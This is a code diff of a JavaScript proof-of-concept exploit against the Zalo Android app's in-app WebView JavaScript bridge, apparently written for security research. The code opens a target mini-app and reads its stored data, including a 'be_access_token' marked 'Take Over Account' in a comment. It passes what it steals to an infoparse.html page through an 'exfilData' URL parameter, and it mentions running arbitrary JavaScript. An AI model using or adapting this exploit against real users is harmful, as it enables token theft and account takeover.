@@ -249,7 +249,7 @@ function webviewAnalyzerZaloInit() {
                 var miniAppIdParam = urlParams.get(ZaloJavaScriptInterface.SeanP.queryParamAppId);
                 if (miniAppIdParam == null || miniAppIdParam == '') {
                     // Default to the Zalo Mini-app App Store
-                    return '2517980822879468590';
+                    return '994455195448288458';
                 }
                 return miniAppIdParam;
             },
@@ -379,7 +379,7 @@ function webviewAnalyzerZaloInit() {
 
             // Try reading stored mini-app data
             var regexCaptureUrl = webviewAnalyzerZaloGetQueryParam('regexCaptureUrl');
-            if (regexCaptureUrl.includes('2517980822879468590') /* Zalo Wallet Mini App ID */) {
+            if (regexCaptureUrl.includes('994455195448288458') /* Zalo Wallet Mini App ID */) {
                 ZaloJavaScriptInterface.SeanP.infoStealCallback = function (msg) {
                     if (typeof(msg) == 'string') {
                         msg = JSON.parse(msg);
@@ -393,13 +393,15 @@ function webviewAnalyzerZaloInit() {
                     var data = msg;
                     // data = atob(data);
                     // data = decodeURIComponent(data);
-                    //alert(JSON.stringify(data));
+                    alert(JSON.stringify(data));
                     var toUrl = `${window.location.protocol}//${window.location.hostname}${window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'))}/infoparse.html?exfilData=${encodeURIComponent(JSON.stringify(data))}`;
                     var token = webviewAnalyzerZaloGetJsToken();
                     ZaloJavaScriptInterface.openLink(token, toUrl);
                     ZaloJavaScriptInterface.jsCall(token, 'action.window.close', '', '{}', 'alert');
                 }
-                ZaloJavaScriptInterface.jsCall(token, 'action.zbrowser.mpds', '', `{"mpds_action":"mpds.get","mpds_data":{"keys":["be_access_token"]},"appId":"2517980822879468590"}`, 'ZaloJavaScriptInterface.SeanP.infoStealCallback');
+                // ZaloJavaScriptInterface.jsCall(token, 'action.zbrowser.mpds', '', `{"mpds_action":"mpds.get","mpds_data":{"keys":["be_access_token"]},"appId":"2517980822879468590"}`, 'ZaloJavaScriptInterface.SeanP.infoStealCallback'); //Be Take Over Account
+                ZaloJavaScriptInterface.jsCall(token, 'action.zbrowser.mpds', '', `{"mpds_action":"mpds.get","mpds_data":{"map":{"isNotFirstTime":"dHJ1ZQ=="}},"appId":"994455195448288458"}`, 'ZaloJavaScriptInterface.SeanP.infoStealCallback'); //Be Take Over Account
+
 
             } else {
                 // Prompt for arbitrary JavaScript to execute
@@ -419,7 +421,7 @@ if (webviewAnalyzerIsZaloWebView()) {
 
     if (!ZaloJavaScriptInterface.SeanP.done) {
         ZaloJavaScriptInterface.SeanP.done = true;
-        ZaloJavaScriptInterface.SeanP.toMiniApp('2517980822879468590');
+        ZaloJavaScriptInterface.SeanP.toMiniApp('994455195448288458');
     }
 } else {
     webViewAnalyzerDisplayError('This proof of concept should be opened within a Zalo Android app WebView.');
